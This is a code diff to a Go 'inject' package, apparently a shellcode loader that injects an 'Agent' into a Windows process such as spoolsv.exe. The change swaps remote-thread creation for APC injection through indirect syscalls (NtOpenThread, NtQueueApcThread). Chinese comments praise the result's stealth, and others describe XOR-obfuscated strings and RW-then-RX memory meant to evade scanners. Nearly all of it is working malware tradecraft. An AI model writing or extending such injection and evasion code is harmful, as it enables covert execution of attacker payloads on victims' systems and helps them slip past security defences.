@@ -5,6 +5,7 @@
 //注释掉了winlogon.exe，添加了spoolsv.exe，目前测试不再崩溃
 //对敏感字符串（注入目标进程）进行了简单的异或加密处理
 //讲敏感的动态链接库名称进行了疑惑加密
+//对内存权限申请进行了修改，避免使用RWX权限，改为先申请RW权限，写入后再改为RX权限
 
 package inject
 
@@ -116,23 +117,75 @@ func Execute(shellcode []byte) error {
 	}
 	fmt.Printf("[+] 内存权限已更改为 RX (规避 RWX 扫描)\n")
 
-	// 5. 在目标进程创建远程线程执行 (使用 Indirect Syscall: NtCreateThreadEx)
-	var hThread uintptr
-	status = NtCreateThreadEx(
-		&hThread,
-		0x1FFFFF, // STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL
-		0,
-		uintptr(hProcess),
-		baseAddr,
-		0,
-		0, // 0 = 立即执行
-		0, 0, 0, 0,
-	)
+	// 5. 使用 APC 注入代替 CreateRemoteThread
+	// 策略：不创建新线程，而是劫持目标进程中的现有线程。
+	// 枚举目标进程的线程 -> 打开线程句柄 -> QueueUserAPC (NtQueueApcThread)
+	fmt.Println("[*] 正在尝试 APC 注入 (Early Bird / Existing Thread)...")
 
-	if status != 0 {
-		return fmt.Errorf("NtCreateThreadEx 失败: 0x%x", status)
+	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
+	if err != nil {
+		return fmt.Errorf("无法创建线程快照: %v", err)
 	}
-	fmt.Printf("[+] 远程线程已创建 (Handle: 0x%x)，Agent 已注入到 %s\n", hThread, targetName)
+	defer windows.CloseHandle(snapshot)
+
+	var te windows.ThreadEntry32
+	te.Size = uint32(unsafe.Sizeof(te))
+
+	if err := windows.Thread32First(snapshot, &te); err != nil {
+		return fmt.Errorf("无线程: %v", err)
+	}
+
+	injected := false
+	for {
+		if te.OwnerProcessID == targetPID {
+			// 找到目标进程的一个线程
+			fmt.Printf("[*] 发现目标线程 TID: %d\n", te.ThreadID)
+
+			// 打开线程句柄 (使用 Indirect Syscall: NtOpenThread)
+			var hThread uintptr
+			clientId := ClientId{
+				UniqueProcess: uintptr(targetPID),
+				UniqueThread:  uintptr(te.ThreadID),
+			}
+			objAttr := ObjectAttributes{Length: uint32(unsafe.Sizeof(ObjectAttributes{}))}
+
+			// THREAD_SET_CONTEXT (0x0010) | THREAD_SUSPEND_RESUME (0x0002) | SYNCHRONIZE (0x00100000)
+			// 为了保险直接申请 THREAD_ALL_ACCESS (0x1FFFFF) ? 不，权限最小化更好.
+			// APC注入需要 THREAD_SET_CONTEXT
+			status = NtOpenThread(&hThread, 0x1FFFFF, &objAttr, &clientId)
+			if status == 0 {
+				// 成功打开线程，插入 APC
+				// 对于 x64 进程，直接从 baseAddr 开始执行
+				statusApc := NtQueueApcThread(hThread, baseAddr, 0, 0, 0)
+				if statusApc == 0 {
+					fmt.Printf("[+] APC 已插入线程 %d\n", te.ThreadID)
+					injected = true
+					// 我们不需要 ResumeThread，因为我们是插入到现有运行线程。
+					// 只要该线程进入 Alertable 状态 (SleepEx, WaitForSingleObjectEx)，Shellcode 就会执行。
+					// 这种方法由于依赖线程状态，可能不会立即执行，但隐蔽性极强。
+					// 如果想强制立即执行，可以尝试挂起再恢复，或者多插几个线程。
+				} else {
+					fmt.Printf("[-] APC 插入失败: 0x%x\n", statusApc)
+				}
+				windows.CloseHandle(windows.Handle(hThread))
+			}
+
+			// 只要成功插入一个，我们就算成功了（多插几个也没坏处，但这只是 Demo）
+			if injected {
+				break
+			}
+		}
+
+		if err := windows.Thread32Next(snapshot, &te); err != nil {
+			break
+		}
+	}
+
+	if !injected {
+		return fmt.Errorf("未能向任何线程插入 APC，注入失败")
+	}
+
+	fmt.Printf("[+] Agent 已通过 APC 调度注入到 %s，将在线程唤醒时执行\n", targetName)
 	fmt.Println("[+] Loader 任务完成，即将退出...")
 
 	// 不等待线程执行，让 Loader 直接退出
